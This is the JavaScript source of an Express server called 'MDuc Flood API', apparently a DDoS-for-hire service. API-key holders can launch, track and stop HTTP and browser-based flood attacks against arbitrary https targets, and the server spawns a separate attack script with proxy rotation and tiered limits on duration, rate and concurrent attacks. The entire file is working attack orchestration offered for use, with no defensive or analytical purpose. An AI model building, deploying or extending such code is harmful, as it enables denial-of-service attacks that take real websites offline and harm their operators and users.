const express = require('express');
const cors = require('cors');
const fs = require('fs');
const path = require('path');
const { spawn } = require('child_process');
const crypto = require('crypto');
const randomstring = require('randomstring');

const app = express();

// ==================== FIX PORT CHO RAILWAY ====================
const PORT = process.env.PORT || process.env.RAILWAY_PORT || 8080;
// ==============================================================

// ==================== CẤU HÌNH ====================
const API_KEYS_FILE = path.join(__dirname, 'apikey.json');
const PROXY_FILE = process.env.PROXY_FILE || "proxy.txt";
const APP_NAME = "MDuc Flood API v2.0";
// ==================================================

app.use(cors());
app.use(express.json());

let activeAttacks = new Map();
let apiKeysData = loadApiKeys();
let dailyUsage = {};

// Middleware kiểm tra API key
function authenticate(req, res, next) {
    const apiKey = req.headers['x-api-key'] || req.query.api_key;
    
    if (!apiKey) {
        return res.status(401).json({ 
            success: false,
            error: "API key is required",
            app: APP_NAME
        });
    }
    
    // Kiểm tra owner key
    if (apiKey === apiKeysData.owner_key) {
        req.isOwner = true;
        req.apiKey = apiKey;
        req.keyData = {
            name: "OWNER",
            max_time: 999999,
            max_threads: 999,
            max_rate: 9999,
            max_concurrent: 999,
            daily_limit: 99999,
            max_browsers: 50,
            allowed_options: ["*"]
        };
        return next();
    }
    
    const keyData = apiKeysData.api_keys[apiKey];
    if (!keyData) {
        return res.status(401).json({ 
            success: false,
            error: "Invalid API key",
            app: APP_NAME
        });
    }
    
    // Kiểm tra hạn sử dụng
    if (keyData.expires_at && new Date(keyData.expires_at) < new Date()) {
        delete apiKeysData.api_keys[apiKey];
        saveApiKeys();
        return res.status(401).json({ 
            success: false,
            error: "API key has expired",
            app: APP_NAME
        });
    }
    
    // Kiểm tra daily limit
    const today = new Date().toISOString().split('T')[0];
    dailyUsage[today] = dailyUsage[today] || {};
    dailyUsage[today][apiKey] = dailyUsage[today][apiKey] || { count: 0, last_reset: Date.now() };
    
    if (dailyUsage[today][apiKey].count >= keyData.daily_limit) {
        return res.status(429).json({ 
            success: false,
            error: "Daily limit exceeded",
            limit: keyData.daily_limit,
            used: dailyUsage[today][apiKey].count,
            app: APP_NAME
        });
    }
    
    // Kiểm tra số lượng tấn công đồng thời - FIXED
    let concurrentCount = 0;
    for (const [_, attack] of activeAttacks) {
        if (attack.apiKey === apiKey) {
            concurrentCount++;
        }
    }
    
    if (concurrentCount >= keyData.max_concurrent) {
        return res.status(429).json({ 
            success: false,
            error: "Maximum concurrent attacks reached",
            max_concurrent: keyData.max_concurrent,
            current: concurrentCount,
            app: APP_NAME
        });
    }
    
    req.isOwner = false;
    req.apiKey = apiKey;
    req.keyData = keyData;
    next();
}

// Middleware chỉ dành cho owner
function ownerOnly(req, res, next) {
    if (!req.isOwner) {
        return res.status(403).json({ 
            success: false,
            error: "Owner access required",
            app: APP_NAME
        });
    }
    next();
}

// ==================== API ENDPOINTS ====================

// 1. Thông tin API
app.get('/api/v1/info', (req, res) => {
    res.json({
        success: true,
        app: APP_NAME,
        version: "2.0.0",
        url: req.protocol + '://' + req.get('host'),
        endpoints: {
            public: ["GET /api/v1/info", "GET /api/v1/system/status"],
            authenticated: [
                "POST /api/v1/attack/start",
                "POST /api/v1/attack/stop/:id",
                "GET /api/v1/attack/status/:id",
                "GET /api/v1/attacks/active",
                "GET /api/v1/key/info"
            ],
            owner_only: [
                "POST /api/v1/key/create",
                "DELETE /api/v1/key/delete/:key",
                "GET /api/v1/keys",
                "GET /api/v1/attacks/all"
            ]
        },
        features: ["Browser-based attacks", "HTTP Flood", "Proxy rotation", "Rate limiting"]
    });
});

// 2. Tạo API key mới (Owner only)
app.post('/api/v1/key/create', authenticate, ownerOnly, (req, res) => {
    try {
        const { 
            name = "New API Key",
            max_time = apiKeysData.settings?.default_max_time || 300,
            max_threads = apiKeysData.settings?.default_max_threads || 20,
            max_rate = apiKeysData.settings?.default_max_rate || 100,
            max_concurrent = apiKeysData.settings?.default_max_concurrent || 3,
            max_browsers = apiKeysData.settings?.default_max_browsers || 5,
            daily_limit = apiKeysData.settings?.default_daily_limit || 10,
            expires_in_days = 30,
            allowed_options = []
        } = req.body;
        
        const apiKey = crypto.randomBytes(32).toString('hex');
        const expiresAt = new Date();
        expiresAt.setDate(expiresAt.getDate() + expires_in_days);
        
        apiKeysData.api_keys[apiKey] = {
            name,
            created_at: new Date().toISOString(),
            expires_at: expiresAt.toISOString(),
            max_time: parseInt(max_time),
            max_threads: parseInt(max_threads),
            max_rate: parseInt(max_rate),
            max_browsers: parseInt(max_browsers),
            max_concurrent: parseInt(max_concurrent),
            daily_limit: parseInt(daily_limit),
            allowed_options: Array.isArray(allowed_options) ? allowed_options : [],
            total_used: 0,
            created_by: req.apiKey.substring(0, 8) + '...'
        };
        
        saveApiKeys();
        
        res.json({
            success: true,
            app: APP_NAME,
            api_key: apiKey,
            key_info: apiKeysData.api_keys[apiKey],
            message: "API key created successfully"
        });
    } catch (error) {
        res.status(500).json({
            success: false,
            error: error.message,
            app: APP_NAME
        });
    }
});

// 3. Bắt đầu tấn công
app.post('/api/v1/attack/start', authenticate, (req, res) => {
    try {
        const { target, time, threads, rate, browser, options = [] } = req.body;
        const { apiKey, keyData, isOwner } = req;
        
        // Validate input
        if (!target || !time || !threads || !rate) {
            return res.status(400).json({ 
                success: false,
                error: "Missing required parameters: target, time, threads, rate",
                app: APP_NAME
            });
        }
        
        if (!target.startsWith('https://')) {
            return res.status(400).json({ 
                success: false,
                error: "Target must start with https://",
                app: APP_NAME
            });
        }
        
        // Validate limits (trừ owner)
        if (!isOwner) {
            if (parseInt(time) > keyData.max_time) {
                return res.status(400).json({ 
                    success: false,
                    error: `Time exceeds maximum allowed (${keyData.max_time} seconds)`,
                    app: APP_NAME
                });
            }
            
            if (parseInt(threads) > keyData.max_threads) {
                return res.status(400).json({ 
                    success: false,
                    error: `Threads exceeds maximum allowed (${keyData.max_threads})`,
                    app: APP_NAME
                });
            }
            
            if (parseInt(rate) > keyData.max_rate) {
                return res.status(400).json({ 
                    success: false,
                    error: `Rate exceeds maximum allowed (${keyData.max_rate} req/s)`,
                    app: APP_NAME
                });
            }
            
            // Validate browser limit
            if (browser && parseInt(browser) > keyData.max_browsers) {
                return res.status(400).json({ 
                    success: false,
                    error: `Browser count exceeds maximum allowed (${keyData.max_browsers})`,
                    app: APP_NAME
                });
            }
        }
        
        // Xử lý options
        let finalOptions = [...options];
        if (browser) {
            finalOptions.push(`--browser ${parseInt(browser)}`);
        }
        
        // Kiểm tra file proxy
        const proxyPath = path.join(__dirname, PROXY_FILE);
        if (!fs.existsSync(proxyPath)) {
            // Tạo file proxy trống nếu chưa có
            fs.writeFileSync(proxyPath, '# Add proxies here\n# Format: http://user:pass@ip:port\n');
        }
        
        // Build command
        const phantomPath = path.join(__dirname, 'script.js');
        const cmdArgs = [
            phantomPath,
            target,
            time.toString(),
            threads.toString(),
            rate.toString(),
            PROXY_FILE,
            ...finalOptions
        ];
        
        // Spawn process
        const child = spawn('node', cmdArgs, {
            cwd: __dirname,
            stdio: ['ignore', 'pipe', 'pipe'],
            detached: true,
            env: { ...process.env, FORCE_COLOR: '0' }
        });
        
        const attackId = `${apiKey}_${Date.now()}_${randomstring.generate(6)}`;
        const today = new Date().toISOString().split('T')[0];
        
        // Cập nhật usage
        if (!isOwner) {
            dailyUsage[today][apiKey] = dailyUsage[today][apiKey] || { count: 0 };
            dailyUsage[today][apiKey].count++;
            apiKeysData.api_keys[apiKey].total_used++;
            saveApiKeys();
        }
        
        // Lưu thông tin tấn công
        activeAttacks.set(attackId, {
            process: child,
            target,
            startTime: Date.now(),
            duration: parseInt(time),
            apiKey,
            attackId,
            childPid: child.pid,
            threads: parseInt(threads),
            rate: parseInt(rate),
            browser: browser ? parseInt(browser) : null,
            options: finalOptions
        });
        
        // Auto stop
        setTimeout(() => {
            if (activeAttacks.has(attackId)) {
                const attack = activeAttacks.get(attackId);
                try {
                    if (attack.process && attack.process.pid) {
                        try {
                            process.kill(-attack.process.pid, 'SIGINT');
                        } catch (e) {
                            attack.process.kill('SIGINT');
                        }
                    }
                } catch (e) {}
                activeAttacks.delete(attackId);
            }
        }, (parseInt(time) + 10) * 1000);
        
        res.json({
            success: true,
            app: APP_NAME,
            attack_id: attackId,
            message: "Attack started successfully",
            details: {
                target,
                duration: parseInt(time),
                threads: parseInt(threads),
                rate: parseInt(rate),
                browser: browser ? parseInt(browser) : 'Not used',
                options: finalOptions,
                estimated_completion: new Date(Date.now() + (time * 1000)).toISOString()
            }
        });
        
    } catch (error) {
        res.status(500).json({
            success: false,
            error: error.message,
            app: APP_NAME
        });
    }
});

// 4. Dừng tấn công
app.post('/api/v1/attack/stop/:attackId', authenticate, (req, res) => {
    try {
        const { attackId } = req.params;
        const { apiKey, isOwner } = req;
        
        const attack = activeAttacks.get(attackId);
        
        if (!attack) {
            return res.status(404).json({ 
                success: false,
                error: "Attack not found",
                app: APP_NAME
            });
        }
        
        if (!isOwner && attack.apiKey !== apiKey) {
            return res.status(403).json({ 
                success: false,
                error: "Not authorized to stop this attack",
                app: APP_NAME
            });
        }
        
        if (attack.process && attack.process.pid) {
            try {
                process.kill(-attack.process.pid, 'SIGINT');
            } catch (e) {
                try {
                    attack.process.kill('SIGINT');
                } catch (e) {}
            }
        }
        
        activeAttacks.delete(attackId);
        
        res.json({ 
            success: true,
            app: APP_NAME,
            message: "Attack stopped successfully" 
        });
        
    } catch (error) {
        res.status(500).json({
            success: false,
            error: error.message,
            app: APP_NAME
        });
    }
});

// 5. Trạng thái tấn công
app.get('/api/v1/attack/status/:attackId', authenticate, (req, res) => {
    try {
        const { attackId } = req.params;
        const { apiKey, isOwner } = req;
        
        const attack = activeAttacks.get(attackId);
        
        if (!attack) {
            return res.status(404).json({ 
                success: false,
                error: "Attack not found or completed",
                app: APP_NAME
            });
        }
        
        if (!isOwner && attack.apiKey !== apiKey) {
            return res.status(403).json({ 
                success: false,
                error: "Not authorized",
                app: APP_NAME
            });
        }
        
        const elapsed = Math.floor((Date.now() - attack.startTime) / 1000);
        const remaining = Math.max(0, attack.duration - elapsed);
        const progress = attack.duration > 0 ? ((elapsed / attack.duration) * 100).toFixed(1) : "0.0";
        
        res.json({
            success: true,
            app: APP_NAME,
            attack_id: attackId,
            target: attack.target,
            status: 'running',
            progress: `${progress}%`,
            elapsed_seconds: elapsed,
            remaining_seconds: remaining,
            details: {
                threads: attack.threads,
                rate: attack.rate,
                browser: attack.browser,
                start_time: new Date(attack.startTime).toISOString(),
                estimated_completion: new Date(attack.startTime + (attack.duration * 1000)).toISOString()
            }
        });
        
    } catch (error) {
        res.status(500).json({
            success: false,
            error: error.message,
            app: APP_NAME
        });
    }
});

// 6. Tất cả tấn công đang chạy
app.get('/api/v1/attacks/active', authenticate, (req, res) => {
    try {
        const { apiKey } = req;
        const attacks = [];
        
        for (const [attackId, attack] of activeAttacks) {
            if (attack.apiKey === apiKey) {
                const elapsed = Math.floor((Date.now() - attack.startTime) / 1000);
                const remaining = Math.max(0, attack.duration - elapsed);
                
                attacks.push({
                    attack_id: attackId,
                    target: attack.target,
                    elapsed_seconds: elapsed,
                    remaining_seconds: remaining,
                    threads: attack.threads,
                    rate: attack.rate,
                    browser: attack.browser,
                    start_time: new Date(attack.startTime).toISOString()
                });
            }
        }
        
        res.json({
            success: true,
            app: APP_NAME,
            total_active: attacks.length,
            max_concurrent: req.keyData.max_concurrent,
            attacks: attacks
        });
        
    } catch (error) {
        res.status(500).json({
            success: false,
            error: error.message,
            app: APP_NAME
        });
    }
});

// 7. Thông tin API key
app.get('/api/v1/key/info', authenticate, (req, res) => {
    try {
        const { apiKey, keyData } = req;
        const today = new Date().toISOString().split('T')[0];
        
        res.json({
            success: true,
            app: APP_NAME,
            api_key: apiKey.substring(0, 12) + '...',
            key_info: {
                name: keyData.name || "Unknown",
                created_at: keyData.created_at,
                expires_at: keyData.expires_at,
                total_used: keyData.total_used || 0,
                daily_used: dailyUsage[today]?.[apiKey]?.count || 0,
                remaining_daily: Math.max(0, keyData.daily_limit - (dailyUsage[today]?.[apiKey]?.count || 0))
            },
            limits: {
                max_time: keyData.max_time,
                max_threads: keyData.max_threads,
                max_rate: keyData.max_rate,
                max_browsers: keyData.max_browsers || 5,
                max_concurrent: keyData.max_concurrent,
                daily_limit: keyData.daily_limit,
                allowed_options: keyData.allowed_options || []
            }
        });
        
    } catch (error) {
        res.status(500).json({
            success: false,
            error: error.message,
            app: APP_NAME
        });
    }
});

// 8. System status
app.get('/api/v1/system/status', (req, res) => {
    try {
        const os = require('os');
        
        res.json({
            success: true,
            app: APP_NAME,
            version: "2.0.0",
            system: {
                uptime: Math.floor(process.uptime()),
                memory_usage: {
                    total_mb: Math.round(os.totalmem() / 1024 / 1024),
                    free_mb: Math.round(os.freemem() / 1024 / 1024),
                    used_percent: ((1 - os.freemem() / os.totalmem()) * 100).toFixed(1)
                },
                cpu_load: os.loadavg().map(l => l.toFixed(2)),
                platform: os.platform(),
                arch: os.arch()
            },
            api_stats: {
                total_active_attacks: activeAttacks.size,
                total_api_keys: Object.keys(apiKeysData.api_keys).length,
                port: PORT
            }
        });
        
    } catch (error) {
        res.status(500).json({
            success: false,
            error: error.message,
            app: APP_NAME
        });
    }
});

// 9. Lấy proxy list
app.get('/api/v1/proxy/list', authenticate, (req, res) => {
    try {
        const proxyPath = path.join(__dirname, PROXY_FILE);
        
        if (!fs.existsSync(proxyPath)) {
            return res.json({
                success: true,
                app: APP_NAME,
                total_proxies: 0,
                proxies: [],
                message: "Proxy file is empty"
            });
        }
        
        const data = fs.readFileSync(proxyPath, 'utf8');
        const proxies = data.split('\n').filter(l => l.trim() && !l.startsWith('#'));
        
        res.json({
            success: true,
            app: APP_NAME,
            total_proxies: proxies.length,
            proxies: proxies.slice(0, 100),
            message: proxies.length > 0 ? "Proxies loaded" : "No proxies found"
        });
        
    } catch (error) {
        res.status(500).json({
            success: false,
            error: error.message,
            app: APP_NAME
        });
    }
});

// 10. Health check cho Railway
app.get('/health', (req, res) => {
    res.status(200).json({
        status: 'healthy',
        app: APP_NAME,
        timestamp: new Date().toISOString(),
        uptime: process.uptime()
    });
});

// ==================== HELPER FUNCTIONS ====================

function loadApiKeys() {
    try {
        if (fs.existsSync(API_KEYS_FILE)) {
            const data = fs.readFileSync(API_KEYS_FILE, 'utf8');
            const parsed = JSON.parse(data);
            
            // Đảm bảo có owner_key
            if (!parsed.owner_key) {
                parsed.owner_key = crypto.randomBytes(32).toString('hex');
                fs.writeFileSync(API_KEYS_FILE, JSON.stringify(parsed, null, 2));
            }
            
            return parsed;
        } else {
            // Tạo file mới với owner key
            const ownerKey = crypto.randomBytes(32).toString('hex');
            const defaultData = {
                owner_key: ownerKey,
                api_keys: {},
                settings: {
                    app_name: APP_NAME,
                    version: "2.0.0",
                    default_max_time: 300,
                    default_max_threads: 20,
                    default_max_rate: 100,
                    default_max_concurrent: 3,
                    default_max_browsers: 5,
                    default_daily_limit: 10,
                    proxy_file: "proxy.txt",
                    allowed_browser_options: ["--browser", "--randpath", "--reset", "--debug", "--close"]
                }
            };
            
            fs.writeFileSync(API_KEYS_FILE, JSON.stringify(defaultData, null, 2));
            
            // HIỂN THỊ RÕ RÀNG TRONG LOGS
            console.log('='.repeat(60));
            console.log('🔐 MDUC FLOOD API - OWNER KEY');
            console.log('='.repeat(60));
            console.log(`Owner Key: ${ownerKey}`);
            console.log('='.repeat(60));
            console.log('📋 COPY KEY ABOVE FOR OWNER ACCESS');
            console.log('='.repeat(60));
            
            return defaultData;
        }
    } catch (error) {
        console.error('Error loading API keys:', error);
        return { 
            owner_key: crypto.randomBytes(32).toString('hex'),
            api_keys: {}, 
            settings: {} 
        };
    }
}

function saveApiKeys() {
    try {
        fs.writeFileSync(API_KEYS_FILE, JSON.stringify(apiKeysData, null, 2));
    } catch (error) {
        console.error('Error saving API keys:', error);
    }
}

// Reset daily usage mỗi ngày
setInterval(() => {
    const today = new Date().toISOString().split('T')[0];
    const yesterday = new Date(Date.now() - 86400000).toISOString().split('T')[0];
    
    if (dailyUsage[yesterday]) {
        delete dailyUsage[yesterday];
    }
    
    dailyUsage[today] = dailyUsage[today] || {};
}, 3600000);

// Proxy scraper
function startProxyScraper() {
    const proxyScript = path.join(__dirname, 'proxy.js');
    
    if (fs.existsSync(proxyScript)) {
        const runScraper = () => {
            console.log(`[${APP_NAME}] Updating proxy list...`);
            const child = spawn('node', [proxyScript, '--silent'], {
                cwd: __dirname,
                detached: true,
                stdio: 'ignore'
            });
            child.unref();
        };
        
        runScraper();
        setInterval(runScraper, 10 * 60 * 1000);
    }
}

// ==================== KHỞI ĐỘNG SERVER ====================
app.listen(PORT, () => {
    console.log(`╔══════════════════════════════════════════════════╗`);
    console.log(`║              MDUC FLOOD API v2.0                ║`);
    console.log(`╚══════════════════════════════════════════════════╝`);
    console.log(`🌐 URL: https://${process.env.RAILWAY_STATIC_URL || 'localhost:' + PORT}`);
    console.log(`📡 Port: ${PORT}`);
    console.log(`📊 API Keys: ${Object.keys(apiKeysData.api_keys).length}`);
    console.log(`⚡ Active Attacks: ${activeAttacks.size}`);
    console.log(`====================================================`);
    
    // Hiển thị endpoint hữu ích
    console.log(`📖 QUICK START:`);
    console.log(`1. Check owner key in logs above`);
    console.log(`2. Test API: curl https://your-url/api/v1/info`);
    console.log(`3. Create API key: POST /api/v1/key/create`);
    console.log(`4. Start attack: POST /api/v1/attack/start`);
    console.log(`   {"target":"https://...","time":60,"threads":10,"rate":90,"browser":5}`);
    console.log(`====================================================`);
    
    startProxyScraper();
});

// Xử lý lỗi unhandled
process.on('uncaughtException', (err) => {
    console.error('Uncaught Exception:', err);
});

process.on('unhandledRejection', (err) => {
    console.error('Unhandled Rejection:', err);
});
